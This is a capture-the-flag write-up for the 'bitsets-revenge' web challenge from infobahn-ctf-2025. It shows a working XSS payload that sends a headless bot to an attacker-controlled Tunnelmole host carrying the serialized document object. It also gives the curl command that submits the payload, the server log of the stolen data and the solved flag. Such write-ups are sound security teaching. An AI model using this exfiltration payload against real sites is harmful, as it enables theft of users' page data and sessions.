---
title: bitsets-revenge
challenge_type: Web
author: "@rewhile @bawolff @yuu"
writeup_author: "@xabito"
competition: infobahn-ctf-2025
summary: |-
  She was not happy that you broke her cookies jar!
connections:
  - url: https://bitset-revenge-web.challs3.infobahnc.tf
attachments:
  - title: This challenge uses the same attachment as bitset-revenge, please capture FLAG2
---

**Note:** This writeup is the second part of the `bitset` challenge series. In this revenge challenge, a fix has been implemented to prevent the unintended solution described in [bitset](/competitions/infobahn-ctf-2025/bitset/). The first and third parts of the series are [bitset-revenge](/competitions/infobahn-ctf-2025/bitset-revenge/) and [bitsetsy-revenge](/competitions/infobahn-ctf-2025/bitsetsy-revenge/), respectively.

## Recon

In the previous challenge, we learned that the Bun server exposed **three** different flags, all of which can be extracted using an XSS payload that sends the data to a webhook server under our control. For a detailed explanation of this exploit, refer to [bitset-revenge](/competitions/infobahn-ctf-2025/bitset-revenge).

```javascript
if (q.length <= 111) {
  flag23 = process.env.FLAG2 || "infobahn{fake_flag2}";
}
if (flag23) {
  await p.evaluateOnNewDocument(flag => {
    if (location.hostname == "127.0.0.1") {
      document["flag" + Math.random().toString(36).slice(2)] = flag;
    }
  }, flag23);
}
```

This time, our goal is to obtain the second flag. To do so, our payload must be no longer than 111 characters. Unlike before, instead of simply reading the cookies, we need to extract the entire `document` object because Puppeteer adds the flag as a property with a random name.

## Exploitation

Fortunately, our previously crafted payload can be adapted, as it is already under the character limit. By using `JSON.stringify(document)` to serialize the `document` object, which is necessary for sending complex JavaScript objects, we achieve a payload that is only 103 characters long.

First, we start a Tunnelmole server to receive requests:

```bash
$ python3 -m http.server 8080 &

$ tmole 8080
Your Tunnelmole Public URLs are below and are accessible internet wide. Always use HTTPs for the best security
https://ofekix-ip-1-2-3-4.tunnelmole.net ⟶   http://localhost:8080
http://ofekix-ip-1-2-3-4.tunnelmole.net ⟶   http://localhost:8080
```

Next, we craft and execute the payload:

```
http://'x=")"onerror='location=`http://ofekix-ip-1-2-3-4.tunnelmole.net/?${JSON.stringify(document)}`' 
```

```bash
$ PAYLOAD="http://'x=\")\"onerror='location=\`http://ofekix-ip-1-2-3-4.tunnelmole.net/?\$\{JSON.stringify(document)\}\`'"

$ curl "https://bitset-revenge-web.challs3.infobahnc.tf/bot?url=${PAYLOAD}"
Cool image (●'◡'●)
```

## Flag capture

After the bot visits our payload, we can retrieve the flag from the logs of our Python server:

```
[200 OK] GET /?{{ '{' }}%22location%22:{{ '{' }}%22ancestorOrigins%22:{},%22href%22:%22http://127.0.0.1:6969/?url=http%3A%2F%2F%27x%3D%22)%22onerror%3D%27location%3D%60http%3A%2F%2Fofekix-ip-1-2-3-4.tunnelmole.net%2F%3F%24%7BJSON.stringify(document)%7D%60%27%22,%22origin%22:%22http://127.0.0.1:6969%22,%22protocol%22:%22http:%22,%22host%22:%22127.0.0.1:6969%22,%22hostname%22:%22127.0.0.1%22,%22port%22:%226969%22,%22pathname%22:%22/%22,%22search%22:%22?url=http%3A%2F%2F%27x%3D%22)%22onerror%3D%27location%3D%60http%3A%2F%2Fofekix-ip-1-2-3-4.tunnelmole.net%2F%3F%24%7BJSON.stringify(document)%7D%60%27%22,%22hash%22:%22%22},%22flagbmp1pqxt5n8%22:%22infobahn{WE_gUE$Sed_7ha7_YOu_fOund_7Hi5_Payl0Ad_ON_p0rtsw19Ger}%22} Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/142.0.0.0 Safari/537.36
[404 Not Found] GET /favicon.ico Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/142.0.0.0 Safari/537.36
```

```
Flag: infobahn{WE_gUE$Sed_7ha7_YOu_fOund_7Hi5_Payl0Ad_ON_p0rtsw19Ger}
```